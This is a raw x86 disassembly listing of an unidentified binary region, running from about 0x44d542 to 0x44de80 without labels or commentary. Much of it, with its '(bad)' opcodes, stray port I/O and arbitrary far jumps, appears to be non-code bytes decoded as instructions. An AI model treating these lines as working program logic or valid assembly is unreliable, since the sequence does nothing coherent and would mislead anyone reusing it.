  44d542:	sub    edx,DWORD PTR [ecx]
  44d544:	cmp    dh,ah
  44d546:	dec    edx
  44d547:	es xor eax,0x662678be
  44d54d:	cs aam 0x25
  44d550:	scas   al,BYTE PTR es:[edi]
  44d551:	cs repnz and eax,0x29ab1f75
  44d558:	push   ebx
  44d559:	sbb    DWORD PTR [edx-0x4beea2d7],ecx
  44d55f:	sub    BYTE PTR [edi+0x9],ch
  44d562:	out    0x28,al
  44d564:	jns    0x44d567
  44d566:	(bad)  [ecx]
  44d568:	loop   0x44d563
  44d56a:	popa   
  44d56b:	sub    ah,BYTE PTR ds:0x7f29f7f2
  44d571:	jmp    0x2b63:0xe2c22ad4
  44d578:	sbb    bl,bl
  44d57a:	and    al,0x2b
  44d57c:	push   edi
  44d57d:	shr    eax,cl
  44d57f:	sub    edx,DWORD PTR [ebx+ecx*8-0x3c5dd433]
  44d586:	mov    bl,0x2b
  44d588:	sar    DWORD PTR [ebx-0xbffd491],0x6d
  44d58f:	mov    esp,0xfcaa6bfd
  44d594:	push   esp
  44d596:	ins    BYTE PTR es:[edi],dx
  44d597:	sub    al,0xb
	...
  44d5b1:	add    BYTE PTR [edx+esi*1],ah
  44d5b4:	sub    al,0xe6
  44d5b6:	add    al,0xbd
  44d5b8:	sub    al,0xfc
  44d5ba:	add    al,0x24
  44d5bc:	sub    eax,0x2d49053f
  44d5c1:	ja     0x44d5c8
  44d5c3:	out    dx,al
  44d5c4:	sub    eax,0x2d82e5ad
  44d5c9:	iret   
  44d5ca:	in     eax,0x2e
  44d5cc:	cs jnp 0x44d5b5
  44d5cf:	sti    
  44d5d0:	cs and al,0xe7
  44d5d3:	jp     0x44d604
  44d5d5:	pop    ebp
  44d5d6:	mov    DWORD PTR [ecx*4-0x61ec7bd0],0x5e147730
  44d5e1:	xor    BYTE PTR [esi+0x14],ah
  44d5e4:	imul   esi,DWORD PTR [eax],0xffffff91
  44d5e7:	adc    ecx,DWORD PTR [ebp+0x30]
  44d5ea:	test   eax,0xc2301813
  44d5ef:	adc    edi,edx
  44d5f1:	das    
  44d5f2:	icebp  
  44d5f3:	adc    cl,dl
  44d5f5:	aaa    
  44d5f6:	sbb    dl,BYTE PTR [ecx]
  44d5f8:	adc    dh,BYTE PTR [eax]
  44d5fa:	pop    es
  44d5fb:	adc    DWORD PTR ds:0x35113b30,esp
  44d601:	xor    BYTE PTR [ecx+edx*1],bl
  44d604:	dec    edi
  44d605:	xor    BYTE PTR [esi],ch
  44d607:	adc    DWORD PTR [ebx-0x4fef95d0],eax
  44d60d:	xor    al,al
  44d60f:	adc    dh,cl
  44d611:	xor    ch,dl
  44d613:	adc    ecx,edi
  44d615:	xor    BYTE PTR [eax],al
	...
  44d62f:	xor    dl,BYTE PTR [edx]
  44d631:	rdtsc  
  44d633:	or     dl,BYTE PTR [edx]
  44d635:	dec    ebp
  44d636:	xor    DWORD PTR [esi],edi
  44d638:	adc    DWORD PTR [ebp-0x46ee7dcf],eax
  44d63e:	xor    ebp,edx
  44d640:	push   cs
  44d641:	adc    DWORD PTR [edx],esi
  44d643:	(bad)  [esi]
  44d645:	xor    bh,BYTE PTR fs:[esi+ecx*1+0x30]
  44d64a:	xor    dl,BYTE PTR [ebx+0xe]
  44d64d:	stos   BYTE PTR es:[edi],al
  44d64e:	xor    bl,bh
  44d650:	ud1    ebp,DWORD PTR [ebx]
  44d653:	ret    
  44d654:	sbb    eax,0x18512f5b
  44d659:	jmp    0x44d683
  44d65b:	test   BYTE PTR [ecx],bl
  44d65d:	sub    BYTE PTR [ecx],ch
  44d65f:	cmp    DWORD PTR [ecx],ebx
  44d661:	inc    edi
  44d662:	sub    DWORD PTR [esi],ebx
  44d664:	sbb    DWORD PTR [edx+ebp*1],ecx
  44d667:	jmp    0x44d67f
  44d669:	add    BYTE PTR [edx-0x70c63633],ch
  44d66f:	(bad)  
  44d671:	cmp    DWORD PTR [edx-0x22],edx
  44d674:	xchg   esi,eax
  44d675:	cmp    DWORD PTR ds:0xc8394ece,eax
  44d67b:	into   
  44d67c:	adc    BYTE PTR [ecx],bh
  44d67e:	mov    bh,0x1e
  44d680:	fistp  QWORD PTR [eax]
  44d682:	jns    0x44d6a2
  44d684:	jne    0x44d6be
  44d686:	dec    ebp
  44d687:	seta   BYTE PTR [eax]
  44d68a:	and    BYTE PTR [edi],cl
  44d68c:	data16 cmp cl,ch
  44d68f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d690:	pop    eax
  44d691:	clc    
  44d692:	lods   eax,DWORD PTR ds:[esi]
	...
  44d6ab:	add    bh,dh
  44d6ad:	add    al,0x0
  44d6af:	out    0x7,al
  44d6b1:	repz das 
  44d6b3:	push   ds
  44d6b4:	add    BYTE PTR [edx],bl
  44d6b6:	xor    BYTE PTR [ebx-0x18],dl
  44d6b9:	sub    BYTE PTR [edi],0x64
  44d6bc:	out    0x77,eax
  44d6be:	das    
  44d6bf:	jge    0x44d6a8
  44d6c1:	cmp    eax,0x62e7c92f
  44d6c6:	das    
  44d6c7:	jmp    0xc873c894
  44d6cc:	rcr    BYTE PTR [edi+ebp*1],0xdf
  44d6d0:	enter  0x2eb2,0x9
  44d6d4:	rcl    ebx,0x2e
  44d6d7:	or     al,0x29
  44d6d9:	jb     0x44d709
  44d6db:	data16 and BYTE PTR [ebx+0x32283d2e],dl
  44d6e2:	mov    esp,DWORD PTR cs:[eax]
  44d6e5:	dec    esi
  44d6e6:	outs   dx,BYTE PTR cs:[esi]
  44d6e8:	or     BYTE PTR [esi+ebp*1],ch
  44d6eb:	es add al,dh
  44d6ee:	sub    eax,0x2dd209c7
  44d6f3:	add    DWORD PTR gs:[edi-0x691664d3],eax
  44d6fa:	sub    eax,0xe4100f00
  44d6ff:	xor    dh,BYTE PTR [edi+0x2f33160f]
  44d705:	lfs    esi,FWORD PTR [ebx]
  44d708:	icebp  
  44d709:	push   cs
  44d70a:	shl    DWORD PTR [ebx],cl
  44d70c:	add    al,0x26
  44d70e:	sysenter 
	...
  44d728:	add    BYTE PTR [esi+eiz*1],dl
  44d72b:	inc    eax
  44d72c:	xor    al,0x4b
  44d72e:	es dec esp
  44d730:	xor    al,0xa9
  44d732:	and    eax,0x266f3464
  44d737:	jp     0x44d76d
  44d739:	push   eax
  44d73a:	es xchg ecx,eax
  44d73c:	xor    al,0xf7
  44d73e:	and    eax,0x14813528
  44d743:	arpl   WORD PTR ds:0x35b8257b,si
  44d749:	and    BYTE PTR ds:0x13d235f5,0x1b
  44d750:	ss in  eax,dx
  44d752:	adc    dh,BYTE PTR [esi+0x36]
  44d755:	jge    0x44d769
  44d757:	fbstp  TBYTE PTR [esi]
  44d759:	add    DWORD PTR [edx+ebx*2],edx
  44d75c:	aaa    
  44d75d:	push   0x8137b713
  44d762:	adc    eax,DWORD PTR [edi]
  44d764:	cmp    BYTE PTR [ecx+ebp*1],bl
  44d767:	nop
  44d768:	cmp    BYTE PTR [edx],cl
  44d76a:	sub    esp,ebx
  44d76c:	cmp    BYTE PTR [edi+0x28],bl
  44d76f:	add    BYTE PTR [ecx],bh
  44d771:	sub    DWORD PTR [ecx],0x16
  44d774:	cmp    bh,ch
  44d776:	es repnz cmp al,0x18
  44d77a:	sub    eax,DWORD PTR [ebx-0x10d54bc2]
  44d780:	xor    BYTE PTR ds:[edx+edi*2],ch
  44d784:	aas    
  44d785:	pop    ebp
  44d786:	popa   
  44d787:	cli    
  44d788:	push   DWORD PTR [ebp+0x0]
	...
  44d7a3:	add    BYTE PTR [eax],al
  44d7a5:	add    ah,dh
  44d7a7:	ins    BYTE PTR es:[edi],dx
  44d7a8:	sub    eax,0x2d9de50e
  44d7ad:	pop    ebp
  44d7ae:	in     eax,0x2f
  44d7b0:	sub    eax,0x2d23e5b7
  44d7b5:	in     al,dx
  44d7b6:	in     eax,0x1
  44d7b8:	xor    ch,BYTE PTR [edi]
  44d7ba:	(bad)  
  44d7bb:	mov    eax,ds:0x74c64d32
  44d7c0:	xor    dh,BYTE PTR [eax-0x3a]
  44d7c3:	sub    al,0x32
  44d7c5:	rol    esi,0xd
  44d7c8:	xor    ah,ah
  44d7ca:	es lock xor ecx,esi
  44d7ce:	es pop edi
  44d7d0:	xor    ecx,DWORD PTR [esi]
  44d7d2:	daa    
  44d7d3:	cmp    eax,0xd7275933
  44d7d8:	xor    eax,DWORD PTR [ebx]
  44d7da:	or     BYTE PTR ds:0x3001528,ch
  44d7e0:	xor    BYTE PTR [ecx],dh
  44d7e2:	or     dl,dh
  44d7e4:	das    
  44d7e5:	aas    
  44d7e6:	add    BYTE PTR [eax+esi*1],ah
  44d7e9:	inc    ebp
  44d7ea:	call   0xe09807fc
  44d7ef:	daa    
  44d7f0:	xor    BYTE PTR [ecx-0x18],bl
  44d7f3:	retf   0xaf2f
  44d7f6:	loopne 0x44d7fa
  44d7f8:	sub    DWORD PTR [ecx+ecx*8],ebp
  44d7fb:	dec    esp
  44d7fc:	sub    DWORD PTR [eax],edi
  44d7fe:	sar    DWORD PTR [edi+0x29],0x12
  44d802:	retf   0x2e3f
  44d805:	dec    edi
  44d806:	ret    0x2e13
  44d809:	je     0x44d80b
	...
  44d823:	sub    dl,dh
  44d825:	les    esp,FWORD PTR cs:[edx]
  44d828:	test   eax,0x312af02e
  44d82d:	das    
  44d82e:	js     0x44d853
  44d830:	push   ss
  44d831:	xor    bh,ah
  44d833:	or     edi,DWORD PTR [esp]
  44d836:	ja     0x44d844
  44d838:	add    eax,0xd3a2b81
  44d83d:	in     eax,dx
  44d83e:	sub    bh,al
  44d840:	or     eax,0xe482a75
  44d845:	call   0xd126:0x5b11752c
  44d84c:	adc    dl,BYTE PTR [eax+0x29]
  44d84f:	push   ebp
  44d850:	adc    al,0xe7
  44d852:	repz adc DWORD PTR [edx+ebx*4+0x3],edx
  44d857:	hlt    
  44d858:	add    al,0xc2
  44d85a:	xor    edx,DWORD PTR [ecx+0x4b334714]
  44d860:	adc    eax,0x15a3325d
  44d865:	lock xor al,0x16
  44d868:	sbb    BYTE PTR [ecx+0xc1aca2f],dl
  44d86e:	xor    DWORD PTR [ecx],edx
  44d870:	or     eax,0xcaa2b4d
  44d875:	(bad)  
  44d876:	sub    cl,BYTE PTR [esi+0xe]
  44d879:	outs   dx,DWORD PTR ds:[esi]
  44d87a:	sub    eax,0x2d880d67
  44d87f:	mov    BYTE PTR ds:0xed82da7,cl
  44d885:	xor    BYTE PTR [edx],ch
	...
  44d89f:	add    BYTE PTR [esi],dl
  44d8a1:	cmovae ebp,DWORD PTR [edx]
  44d8a4:	pop    edi
  44d8a5:	bts    DWORD PTR [ebx],ebp
  44d8a8:	jmp    0xbf6d6abd
  44d8ad:	adc    DWORD PTR [ebx],edx
  44d8af:	es leave 
  44d8b1:	adc    ebp,DWORD PTR [edx+0x27]
  44d8b4:	hlt    
  44d8b5:	add    al,0xe7
  44d8b7:	cmp    DWORD PTR [ecx+0x53],0x46
  44d8bb:	add    al,0xf4
  44d8bd:	add    al,0x36
  44d8bf:	xor    al,0xc3
  44d8c1:	adc    al,0xb
  44d8c3:	xor    al,0xda
  44d8c5:	adc    al,0x5d
  44d8c7:	xor    al,0x94
  44d8c9:	adc    al,0x0
  44d8cb:	inc    edx
  44d8cc:	or     BYTE PTR [edi+ebp*1+0x2f43009d],ah
  44d8d3:	push   ebx
  44d8d4:	or     BYTE PTR [ebp+0x2f],dl
  44d8d7:	out    0x0,eax
  44d8d9:	add    DWORD PTR [edi],ebp
  44d8db:	imul   ebp,ecx,0xe1512eab
  44d8e1:	cli    
  44d8e2:	sub    eax,0x2d72e5b7
  44d8e7:	in     al,dx
  44d8e8:	out    0xe,al
  44d8ea:	sub    eax,0x2cc6c6ab
  44d8ef:	mov    ds:0xbb2cbec6,eax
  44d8f4:	(bad)  
  44d8f5:	mov    dh,0x2c
  44d8f7:	ret    
  44d8f8:	(bad)  
  44d8f9:	scas   al,BYTE PTR es:[edi]
  44d8fa:	sub    al,0x8b
  44d8fc:	es out 0x2c,eax
  44d8ff:	and    DWORD PTR [esi],0xffffffdf
  44d902:	sub    al,0x7b
	...
  44d91c:	add    BYTE PTR [esi],ah
  44d91e:	xlat   BYTE PTR ds:[ebx]
  44d91f:	sub    al,0x83
  44d921:	es dec edx
  44d923:	sub    al,0x7
  44d925:	pop    es
  44d926:	xor    BYTE PTR [edx],0xfa
  44d929:	add    al,0xc1
  44d92b:	xor    DWORD PTR [edx+0x12],edx
  44d92e:	aam    0x31
  44d930:	stos   BYTE PTR es:[edi],al
  44d931:	or     DWORD PTR [esi],edi
  44d933:	xor    esi,ebx
  44d935:	loope  0x44d989
  44d937:	xor    ecx,edi
  44d939:	fisub  DWORD PTR ds:0xd7d35731
  44d93f:	xor    BYTE PTR [edx+ecx*8-0x202dcfd3],ch
  44d946:	jg     0x44d97e
  44d948:	mov    ebx,eax
  44d94a:	stos   BYTE PTR es:[edi],al
  44d94b:	ss sar BYTE PTR gs:[esi+esi*1],1
  44d950:	scas   al,BYTE PTR es:[edi]
  44d951:	enter  0x3567,0xd9
  44d955:	push   ds
  44d956:	lods   al,BYTE PTR ds:[esi]
  44d957:	xor    al,0x29
  44d959:	sbb    al,0xc6
  44d95b:	cmp    eax,DWORD PTR [eax]
  44d95d:	neg    BYTE PTR [eax+eax*4]
  44d960:	cmp    al,0xa7
  44d962:	sbb    eax,0x28893dfa
  44d967:	cmp    DWORD PTR [esi],edi
  44d969:	and    ch,BYTE PTR [ebx]
  44d96b:	cmp    BYTE PTR [edi],bh
  44d96d:	xchg   ebx,eax
  44d96e:	sub    eax,DWORD PTR [eax]
  44d970:	add    BYTE PTR [ebp+0x76],cl
  44d973:	cli    
  44d974:	inc    DWORD PTR [ecx+0x6]
  44d977:	add    BYTE PTR [eax],al
  44d979:	xor    ebx,DWORD PTR [ecx]
  44d97b:	shl    BYTE PTR [ecx],0xd9
  44d97e:	sbb    BYTE PTR [edx],al
  44d980:	xor    al,BYTE PTR [eax]
	...
  44d99a:	jge    0x44d9b0
  44d99c:	add    al,0x33
  44d99e:	test   eax,0x8933b316
  44d9a3:	and    DWORD PTR [edi],ecx
  44d9a5:	xor    eax,0x35f41552
  44d9aa:	add    esp,DWORD PTR [eax]
  44d9ac:	add    dh,BYTE PTR [edi]
  44d9ae:	mov    ecx,0xea375a22
  44d9b3:	pop    ds
  44d9b4:	std    
  44d9b5:	aaa    
  44d9b6:	out    0x1d,eax
  44d9b8:	(bad)  
  44d9b9:	cmp    ah,dh
  44d9bb:	sbb    eax,0x1e8a3912
  44d9c0:	ins    DWORD PTR es:[edi],dx
  44d9c1:	cmp    edx,DWORD PTR [ebx+0x1f]
  44d9c4:	lahf   
  44d9c5:	cmp    edx,DWORD PTR [esi-0x52c42fe5]
  44d9cb:	sbb    edi,DWORD PTR [eax]
  44d9cd:	cmp    al,0x39
  44d9cf:	sbb    eax,0x1d2a3c9b
  44d9d4:	mov    dl,0x3c
  44d9d6:	sbb    DWORD PTR [ebx+ebx*8],0x6d2a893c
  44d9dd:	cmp    eax,0x3dcd297a
  44d9e2:	stos   BYTE PTR es:[edi],al
  44d9e3:	daa    
  44d9e4:	jge    0x44da24
  44d9e6:	sbb    DWORD PTR [ebx],ebp
  44d9e8:	adc    bh,BYTE PTR [edi]
  44d9ea:	xchg   edi,eax
  44d9eb:	sub    BYTE PTR [ecx-0x63a40bc1],al
  44d9f1:	std    
  44d9f2:	imul   ebp,DWORD PTR [edi-0x240bfffd],0x33
  44d9f9:	fwait
  44d9fa:	and    al,0xa5
  44d9fc:	sub    al,0x34
	...
  44da16:	add    BYTE PTR [esi],al
  44da18:	scas   eax,DWORD PTR es:[edi]
  44da19:	sub    eax,0x2856072c
  44da1e:	mov    esi,0xbb28f908
  44da23:	add    DWORD PTR [ebx+0x2aea7b28],edi
  44da29:	sub    bh,dh
  44da2b:	loop   0x44da19
  44da2d:	sub    ah,BYTE PTR [ecx-0x15]
  44da30:	mov    cl,0x2a
  44da32:	sub    eax,0x42441dc
  44da37:	int    0x54
  44da39:	and    eax,0x24b5cd49
  44da3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44da3f:	mov    ebp,0xbddc250e
  44da44:	(bad)  
  44da45:	and    al,0xe7
  44da47:	sub    eax,0x2dfe24f3
  44da4c:	fs adc BYTE PTR es:[esi],bl
  44da50:	cmp    esp,DWORD PTR [esi]
  44da52:	xor    ebx,DWORD PTR [esi]
  44da54:	fldenv [esi]
  44da56:	stos   DWORD PTR es:[edi],eax
  44da57:	push   cs
  44da58:	sbb    eax,0x9b0ed226
  44da5d:	daa    
  44da5e:	dec    esp
  44da5f:	call   DWORD PTR [esi+0x5bffd327]
  44da65:	and    BYTE PTR [edi],cl
  44da67:	lock or eax,0x89e87f28
  44da6d:	and    bh,al
  44da6f:	loopne 0x44dadc
  44da71:	and    bh,dl
  44da73:	fsubr  DWORD PTR [esi+0x20]
  44da76:	out    dx,eax
  44da77:	rcl    BYTE PTR [ebp+0x20],1
	...
  44da91:	add    BYTE PTR [eax],al
  44da93:	add    cl,cl
  44da95:	inc    ecx
  44da96:	and    DWORD PTR ds:0x271e04c1,esp
  44da9c:	push   0x12
  44da9e:	pop    ecx
  44da9f:	es std 
  44daa1:	push   cs
  44daa2:	jmp    0xa624:0x6d0fbd24
  44daa9:	adc    BYTE PTR [edx-0x18fb0bdc],al
  44daaf:	mov    bl,0x51
  44dab1:	push   eax
  44dab2:	loop   0x44dab5
  44dab4:	hlt    
  44dab5:	add    al,0xe2
  44dab7:	xor    esp,esi
  44dab9:	adc    eax,0x15b1330f
  44dabe:	int    0x32
  44dac0:	je     0x44dad8
  44dac2:	jb     0x44daf6
  44dac4:	push   ebp
  44dac5:	push   ss
  44dac6:	jl     0x44dafa
  44dac8:	bound  edx,QWORD PTR [esi]
  44daca:	stos   BYTE PTR es:[edi],al
  44dacb:	xor    DWORD PTR [edi-0x66ce96ee],esp
  44dad1:	adc    esp,DWORD PTR [eax+esi*1-0x25]
  44dad5:	sbb    BYTE PTR [edx-0x6e6ced1],bh
  44dadb:	cs aad 0x19
  44dade:	int3   
  44dadf:	cs fwait
  44dae1:	sbb    DWORD PTR [edi+0x2e],edx
  44dae4:	mov    al,0x19
  44dae6:	sbb    eax,0x7417062e
  44daeb:	sub    eax,0x2d411686
  44daf0:	lahf   
  44daf1:	push   ss
  44daf2:	pop    es
  44daf3:	sub    eax,0x2ced16d6
	...
  44db10:	add    dl,ch
  44db12:	pop    ss
  44db13:	adc    ebx,DWORD PTR [ebx]
  44db15:	add    bl,BYTE PTR [eax]
  44db17:	and    bl,BYTE PTR [ebx]
  44db19:	push   edx
  44db1a:	sbb    BYTE PTR [edx+0x1b],al
  44db1d:	xchg   DWORD PTR [edi],edx
  44db1f:	mov    DWORD PTR [ebx],ebx
  44db21:	rcl    DWORD PTR [edi],0xd3
  44db24:	sbb    ecx,DWORD PTR [ecx-0x9e443e9]
  44db2a:	or     al,0x0
  44db2c:	shr    edi,1
  44db2e:	ret    0xc37
  44db31:	loopne 0x44db03
  44db33:	aaa    
  44db34:	js     0x44db0e
  44db36:	jb     0x44db6f
  44db38:	dec    esi
  44db39:	adc    BYTE PTR [edx],dh
  44db3b:	aaa    
  44db3c:	jmp    0x167b8b49
  44db41:	add    DWORD PTR [eax+0x42f93e36],eax
  44db47:	ss scas eax,DWORD PTR es:[edi]
  44db49:	icebp  
  44db4a:	div    DWORD PTR ds:0x35d0e9bd
  44db50:	addr16 loop 0x44dad9
  44db53:	xor    eax,0x3575da78
  44db58:	adc    BYTE PTR [edx],0xa5
  44db5b:	xor    eax,0x35a70a8c
  44db60:	jle    0x44db64
  44db62:	cdq    
  44db63:	xor    eax,0x358afa80
  44db68:	sub    dh,dl
  44db6a:	cmp    al,0x35
  44db6c:	and    al,0xea
  44db6e:	ds xor eax,0x3530e216
  44db74:	or     BYTE PTR [eax],al
	...
  44db8e:	fisub  DWORD PTR [edx+0x35]
  44db91:	adc    dl,BYTE PTR [edx]
  44db93:	push   ebp
  44db94:	xor    eax,0x35570a1c
  44db99:	push   cs
  44db9a:	add    cl,BYTE PTR [ecx]
  44db9c:	xor    eax,0x34fafaf0
  44dba1:	(bad)  
  44dba3:	in     al,dx
  44dba4:	xor    al,0xd4
  44dba6:	jmp    0x3520:0xe2c634ee
  44dbad:	sbb    bl,bl
  44dbaf:	adc    dh,BYTE PTR ds:0x34c51322
  44dbb5:	sub    al,0xb
  44dbb7:	(bad)  
  44dbb8:	xor    al,0x1e
  44dbba:	add    edi,DWORD PTR [ecx-0x122bffcc]
  44dbc0:	push   ebp
  44dbc1:	cmp    edi,DWORD PTR [esi]
  44dbc3:	out    dx,al
  44dbc4:	cmp    esi,DWORD PTR [bx+si]
  44dbc7:	out    dx,al
  44dbc8:	imul   edi,DWORD PTR [ebx],0x3b7bedca
  44dbce:	or     al,0xef
  44dbd0:	jge    0x44dc0d
  44dbd2:	out    0xee,al
  44dbd4:	(bad)  
  44dbd5:	cmp    ebp,eax
  44dbd7:	out    dx,al
  44dbd8:	xchg   ecx,eax
  44dbd9:	cmp    edx,edx
  44dbdb:	out    dx,al
  44dbdc:	mov    ds:0xa5eec43b,eax
  44dbe1:	cmp    ecx,DWORD PTR [esi]
  44dbe3:	out    dx,eax
  44dbe4:	mov    bh,0x3b
  44dbe6:	add    bh,ch
  44dbe8:	mov    ecx,0xcbef9a3b
  44dbed:	cmp    edi,esp
  44dbef:	out    dx,al
  44dbf0:	int    0x3b
	...
  44dc0a:	add    BYTE PTR [esi-0x47c42012],dh
  44dc10:	out    dx,al
  44dc11:	loope  0x44dc4e
  44dc13:	loop   0x44dc03
  44dc15:	repz cmp esi,DWORD PTR [esi+ebp*8-0x11e1c40b]
  44dc1d:	pop    es
  44dc1e:	cmp    al,0x10
  44dc20:	out    dx,al
  44dc21:	or     DWORD PTR [edx+ebp*1],edi
  44dc24:	out    dx,al
  44dc25:	sbb    edi,DWORD PTR [esp+ebp*1]
  44dc28:	out    dx,al
  44dc29:	sbb    eax,0x2fedc63c
  44dc2e:	cmp    al,0xc8
  44dc30:	in     eax,dx
  44dc31:	xor    DWORD PTR [edx+esi*4],edi
  44dc34:	in     eax,dx
  44dc35:	inc    ebx
  44dc36:	cmp    al,0xa4
  44dc38:	in     eax,dx
  44dc39:	inc    ebp
  44dc3a:	cmp    al,0x6e
  44dc3c:	in     eax,dx
  44dc3d:	push   edi
  44dc3e:	cmp    al,0x60
  44dc40:	in     eax,dx
  44dc41:	pop    ecx
  44dc42:	cmp    al,0x7a
  44dc44:	in     eax,dx
  44dc45:	imul   edi,DWORD PTR [esp+ebx*1],0x25
  44dc49:	outs   dx,BYTE PTR ds:[esi]
  44dc4a:	cmp    al,0x16
  44dc4c:	and    eax,0xe0f43c80
  44dc51:	pop    ds
  44dc52:	xchg   al,ah
  44dc54:	scas   al,BYTE PTR es:[edi]
  44dc55:	pop    ds
  44dc56:	xchg   esp,eax
  44dc57:	fsub   st,st(4)
  44dc59:	pop    ds
  44dc5a:	call   0x88c8:0xa81f7ad0
  44dc61:	pop    ds
  44dc62:	scas   al,BYTE PTR es:[edi]
  44dc63:	rcl    dh,0x1f
  44dc66:	mov    esp,0xc81f9cb8
  44dc6b:	xor    BYTE PTR [ecx+0xd51f],ah
	...
  44dc85:	add    BYTE PTR [eax],al
  44dc87:	add    BYTE PTR [eax],ch
  44dc89:	jl     0x44dcaa
  44dc8b:	call   0xf364aab0
  44dc90:	sbb    BYTE PTR [ebx+0x5410fe1f],al
  44dc96:	sbb    DWORD PTR [ecx],ecx
  44dc98:	or     DWORD PTR [ecx],esi
  44dc9a:	sbb    DWORD PTR [edx],ebx
  44dc9c:	add    DWORD PTR [ebx],edi
  44dc9e:	sbb    DWORD PTR [ecx+edi*8],esi
  44dca1:	daa    
  44dca2:	sbb    DWORD PTR [esi],edi
  44dca4:	icebp  
  44dca5:	xchg   ebx,eax
  44dca6:	sbb    DWORD PTR [edx-0x17],ecx
  44dca9:	inc    ebp
  44dcaa:	sbb    DWORD PTR [eax-0x36e6dc1f],esp
  44dcb0:	fldenv [ecx+ebx*1]
  44dcb3:	out    0xd1,al
  44dcb5:	sbb    BYTE PTR [ecx],bl
  44dcb7:	add    dl,cl
  44dcb9:	popa   
  44dcba:	push   ds
  44dcbb:	adc    al,0xc2
  44dcbd:	add    eax,0x67ba2e1e
  44dcc2:	push   ds
  44dcc3:	inc    esi
  44dcc4:	xor    cl,BYTE PTR [eax+0x1e]
  44dcc7:	arpl   WORD PTR [edx],bp
  44dcc9:	sbb    DWORD PTR [esi],0x1de22276
  44dccf:	mov    ds,WORD PTR [edx]
  44dcd1:	out    0x1d,al
  44dcd3:	scas   eax,DWORD PTR es:[edi]
  44dcd4:	adc    al,dh
  44dcd6:	sbb    eax,0x1e260abf
  44dcdb:	retf   
  44dcdc:	add    dh,cl
  44dcde:	sbb    eax,0xd004fad9
  44dce3:	and    DWORD PTR [eax-0x2df0ff5],esi
  44dce9:	or     edi,esp
  44dceb:	and    BYTE PTR [eax],al
	...
  44dd05:	or     DWORD PTR [eax+eax*1],ecx
  44dd08:	and    edx,ecx
  44dd0a:	or     eax,DWORD PTR [eax]
  44dd0c:	and    ebp,ecx
  44dd0e:	or     ebx,DWORD PTR [eax]
  44dd10:	and    DWORD PTR [esp+ecx*1],ebp
  44dd13:	inc    edi
  44dd14:	and    DWORD PTR [esi],edx
  44dd16:	or     al,0x3c
  44dd18:	and    DWORD PTR [esi],eax
  44dd1a:	or     al,0x24
  44dd1c:	and    ecx,esi
  44dd1e:	or     esi,DWORD PTR [eax+eiz*1-0x78]
  44dd22:	or     al,0x4b
  44dd24:	and    BYTE PTR [edx+0x34204f0c],bl
  44dd2a:	or     al,0xaa
  44dd2c:	and    BYTE PTR [edi],bh
  44dd2e:	or     al,0x99
  44dd30:	and    BYTE PTR [eax+0xc],dl
  44dd33:	and    DWORD PTR [eax],0x52
  44dd36:	or     al,0x6e
  44dd38:	and    ah,dh
  44dd3a:	add    al,0xe7
  44dd3c:	inc    ebx
  44dd3d:	xor    DWORD PTR [edx+ebp*8+0x2],ecx
  44dd41:	hlt    
  44dd42:	add    al,0xeb
  44dd44:	adc    edi,ecx
  44dd46:	adc    al,0xed
  44dd48:	adc    edi,edx
  44dd4a:	adc    al,0x10
  44dd4c:	adc    al,0xdd
  44dd4e:	adc    al,0xa9
  44dd50:	adc    esp,DWORD PTR [edi-0x5dec6cec]
  44dd56:	adc    al,0xbd
  44dd58:	adc    ecx,DWORD PTR [ebx+0x69139c14]
  44dd5e:	adc    eax,0x14731368
  44dd63:	jb     0x44dd78
  44dd65:	leave  
  44dd66:	adc    al,0x5
  44dd68:	adc    eax,DWORD PTR [eax]
	...
  44dd82:	rcl    DWORD PTR [edx+edx*1],cl
  44dd85:	adc    eax,ebp
  44dd87:	adc    al,0xf9
  44dd89:	adc    cl,dl
  44dd8b:	adc    al,0x0
  44dd8d:	loope  0x44dd75
  44dd8f:	(bad)  
  44dd90:	xlat   BYTE PTR cs:[ebx]
  44dd92:	out    0x1d,al
  44dd94:	das    
  44dd95:	inc    eax
  44dd96:	or     ebx,ebx
  44dd98:	test   DWORD PTR cs:[ecx],eax
  44dd9b:	push   edx
  44dd9c:	cs clc 
  44dd9e:	add    eax,0x6752e21
  44dda3:	gs sub eax,0x2cf7e6c1
  44dda9:	and    ah,bh
  44ddab:	xchg   BYTE PTR [edx],dh
  44ddad:	into   
  44ddae:	fst    QWORD PTR [ebp+0x32]
  44ddb1:	lods   al,BYTE PTR ds:[esi]
  44ddb2:	frstor [ecx]
  44ddb4:	xor    dh,BYTE PTR [eax]
  44ddb6:	or     bl,dl
  44ddb8:	xor    DWORD PTR [edi+0x2],esi
  44ddbb:	jo     0x44ddee
  44ddbd:	test   eax,0xe831620a
  44ddc2:	add    ch,dh
  44ddc4:	xor    BYTE PTR [ecx-0xcf4916],bh
  44ddca:	loop   0x44de02
  44ddcc:	xor    BYTE PTR [ebx+0x1c380cdf],bh
  44ddd2:	fdiv   DWORD PTR [edx-0x78f029c9]
  44ddd8:	aaa    
  44ddd9:	jge    0x44dde3
  44dddb:	cdq    
  44dddc:	aaa    
  44dddd:	sub    al,BYTE PTR [eax]
  44dddf:	xor    al,0x37
  44dde1:	pop    eax
  44dde2:	clc    
  44dde3:	in     al,dx
  44dde4:	inc    DWORD PTR ss:[eax]
	...
  44ddff:	lock mov dh,0x36
  44de02:	into   
  44de03:	call   0xddf41415
  44de08:	lods   eax,DWORD PTR ds:[esi]
  44de09:	xor    eax,0x3569de55
  44de0e:	addr16 push cs
  44de10:	add    al,0x35
  44de12:	out    dx,al
  44de13:	push   cs
  44de14:	outs   dx,DWORD PTR ds:[esi]
  44de15:	xor    al,0x5d
  44de17:	(bad)  
  44de18:	cmp    BYTE PTR [ebp*1+0x3458ff],dh
  44de1f:	fucomip st,st(2)
  44de21:	or     eax,0x2deab33c
  44de26:	cmp    al,0x67
  44de28:	jmp    0x3ca5:0x25203c73
  44de2f:	arpl   dx,bp
  44de31:	fnstsw WORD PTR [edx+ecx*8]
  44de34:	jmp    0x3d09:0x25963cfc
  44de3b:	cmc    
  44de3c:	and    ecx,DWORD PTR [edi+0x3d]
  44de3f:	and    eax,0x73d6a24
  44de44:	and    eax,0x25743d8b
  44de49:	ret    
  44de4a:	cmp    eax,0x3de72564
  44de4f:	ins    BYTE PTR es:[edi],dx
  44de50:	call   0xe8851c6b
  44de55:	dec    esi
  44de56:	ds lock jmp 0x3ea2:0xe7c83e72
  44de5f:	pushf  
  44de60:	call   0x451d42
	...
  44de79:	add    BYTE PTR [eax],al
  44de7b:	add    cl,al
  44de7d:	out    0x1,eax
  44de7f:	aas    
  44de80:	cmp    ch,bl
